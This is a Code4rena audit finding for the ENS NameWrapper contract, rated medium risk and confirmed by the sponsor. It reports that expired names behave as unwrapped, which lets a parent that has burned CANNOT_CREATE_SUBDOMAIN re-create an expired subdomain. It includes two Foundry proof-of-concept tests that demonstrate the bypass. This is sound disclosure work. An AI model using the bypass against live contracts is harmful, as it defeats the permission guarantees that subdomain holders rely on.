## Tags

- bug
- 2 (Med Risk)
- selected for report
- sponsor confirmed
- M-02

# [NameWrapper: expired names behave unwrapped](https://github.com/code-423n4/2022-11-ens-findings/issues/7) 

# Lines of code

https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L512
https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L550


# Vulnerability details

## Impact

- expired Names are supposed to be unregistered, but it behaves like unwrapped
- parent with `CANNOT_CREATE_SUBDOMAIN` fuse can "create" again an expired name
- parent can `ENS.setSubdomainOwner` before burning `CANNOT_CREATE_SUBDOMAIN` to be able to use the subdomain later


## Proof of Concept

Below is a snippet of the proof of concept. The whole code can be found in [this gist](https://gist.github.com/zzzitron/7670730176e35d7b2322bc1f4b9737f0#file-2022-11-ens-versus-poc-t-sol). And how to run test is in the comment in the gist.

As in the `wrapper/README.md`:

> To check if a name is Unregistered, verify that `NameWrapper.ownerOf` returns `address(0)` and so does `Registry.owner`.
> To check if a name is Unwrapped, verify that `NameWrapper.ownerOf` returns `address(0)` and `Registry.owner` does not.

Also, an expired name should go to Unregistered state per the graph suggests.
 
But, as the proof of concept below shows, after expiration, `NameWrapper.ownerOf(node)` is zero but `ens.owner(node)` is not zero. It is `Unwrapped` state based on the `wrapper/README.md`.


```solidity
    function testM3ExpiredNamesBehavesUnwrapped() public {
        string memory str_node = 'vitalik.eth';
        (bytes memory dnsName, bytes32 node) = str_node.dnsEncodeName();
        // before wrapping the name check
        assertEq(user1, ens.owner(node));
        (address owner, uint32 fuses, uint64 expiry) = nameWrapper.getData(uint256(node));
        assertEq(owner, address(0));

        // -- wrapETH2LD
        vm.prank(user1);
        registrar.setApprovalForAll(address(nameWrapper), true);
        vm.prank(user1);
        nameWrapper.wrapETH2LD('vitalik', user1, 0, address(0));
        // after name wrap check
        (owner, fuses, expiry) = nameWrapper.getData(uint256(node));
        assertEq(owner, user1);
        assertEq(fuses, PARENT_CANNOT_CONTROL | IS_DOT_ETH);
        assertEq(expiry, 2038123728);
        // wrapETH2LD --

        vm.warp(2038123729);
        // after expiry
        (owner, fuses, expiry) = nameWrapper.getData(uint256(node));
        assertEq(owner, address(0));
        assertEq(fuses, 0);
        assertEq(expiry, 2038123728);
        assertEq(nameWrapper.ownerOf(uint256(node)), address(0));
        assertEq(ens.owner(node), address(nameWrapper)); // registry.owner is not zero
        vm.expectRevert();
        registrar.ownerOf(uint256(node));
    }
```

Since an expired name is technically unwrapped, even a parent with `CANNOT_CREATE_SUBDOMAIN` can set the owner or records of the subdomain as the proof of concept below shows.

```solidity
    function testM3ExpiredNameCreate() public {
        // After expired, the ens.owner's address is non-zero
        // therefore, the parent can 'create' the name evne CANNOT_CREATE_SUBDOMAIN is burned
        string memory parent = 'vitalik.eth';
        string memory sub1_full = 'sub1.vitalik.eth';
        string memory sub1 = 'sub1';
        (, bytes32 parent_node) = parent.dnsEncodeName();
        (bytes memory sub1_dnsname, bytes32 sub1_node) = sub1_full.dnsEncodeName();

        // wrap parent and lock
        vm.prank(user1);
        registrar.setApprovalForAll(address(nameWrapper), true);
        vm.prank(user1);
        nameWrapper.wrapETH2LD('vitalik', user1, uint16(CANNOT_UNWRAP), address(0));
        // checks
        (address owner, uint32 fuses, uint64 expiry) = nameWrapper.getData(uint256(parent_node));
        assertEq(owner, user1);
        assertEq(fuses, PARENT_CANNOT_CONTROL | IS_DOT_ETH | CANNOT_UNWRAP);
        assertEq(expiry, 2038123728);

        // create subnode
        vm.prank(user1);
        nameWrapper.setSubnodeOwner(parent_node, 'sub1', user2, PARENT_CANNOT_CONTROL, 1700000000);
        (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));
        assertEq(owner, user2);
        assertEq(fuses, PARENT_CANNOT_CONTROL);
        assertEq(expiry, 1700000000);

        // now parent cannot create subdomain
        vm.prank(user1);
        nameWrapper.setFuses(parent_node, uint16(CANNOT_CREATE_SUBDOMAIN));
        (owner, fuses, expiry) = nameWrapper.getData(uint256(parent_node));
        assertEq(fuses, PARENT_CANNOT_CONTROL | IS_DOT_ETH | CANNOT_UNWRAP | CANNOT_CREATE_SUBDOMAIN);
        // parent: pcc cu CANNOT_CREATE_SUBDOMAIN
        // child: pcc
        // unwrap and sets the owner to zero

        // parent cannot use setSubnodeRecord on PCCed sub
        vm.expectRevert(abi.encodeWithSelector(OperationProhibited.selector, sub1_node));
        vm.prank(user1);
        nameWrapper.setSubnodeRecord(parent_node, sub1, user1, address(1), 10, 0, 0);

        // expire sub1
        vm.warp(1700000001);
        (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));
        assertEq(owner, address(0));
        assertEq(fuses, 0);
        assertEq(expiry, 1700000000);
        assertEq(ens.owner(sub1_node), address(nameWrapper));

        // user1 can re-"create" sub1 even though CANNOT_CREATE_SUBDOMAIN is set on parent
        vm.prank(user1);
        nameWrapper.setSubnodeRecord(parent_node, sub1, address(3), address(11), 10, 0, 0);
        (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));
        assertEq(owner, address(3));
        assertEq(fuses, 0);
        assertEq(expiry, 1700000000);
        assertEq(ens.owner(sub1_node), address(nameWrapper));

        // comparison: tries create a new subdomain and revert
        string memory sub2 = 'sub2';
        string memory sub2_full = 'sub2.vitalik.eth';
        (, bytes32 sub2_node) = sub2_full.dnsEncodeName();
        vm.expectRevert(abi.encodeWithSelector(OperationProhibited.selector, sub2_node));
        vm.prank(user1);
        nameWrapper.setSubnodeRecord(parent_node, sub2, user2, address(11), 10, 0, 0);
    }
```

## Tools Used

foundry

## Recommended Mitigation Steps

Unclear as the `NameWrapper` cannot set ENS.owner after expiration automatically.

<!-- zzzitron M03 -->

